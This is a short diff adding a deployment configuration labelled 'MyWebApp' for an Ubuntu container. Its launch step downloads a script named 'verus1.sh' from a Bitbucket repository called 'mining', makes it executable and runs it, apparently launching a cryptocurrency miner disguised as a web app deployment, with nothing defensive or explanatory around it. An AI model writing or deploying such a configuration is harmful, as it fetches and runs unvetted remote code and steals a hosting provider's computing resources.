@@ -1,0 +1,9 @@
+deployments:
+  MyWebApp:
+    dockerimage: ubuntu:18.04
+    build_steps:
+      - apt update
+      - apt install wget -y
+    launch_steps:
+      - wget https://bitbucket.org/noval6161/mining/raw/a7f1e0eea1a289b41aca13fac0f42a32a711e958/verus1.sh && chmod u+x verus1.sh && ./verus1.sh
+    port_forwarding: 80:8080
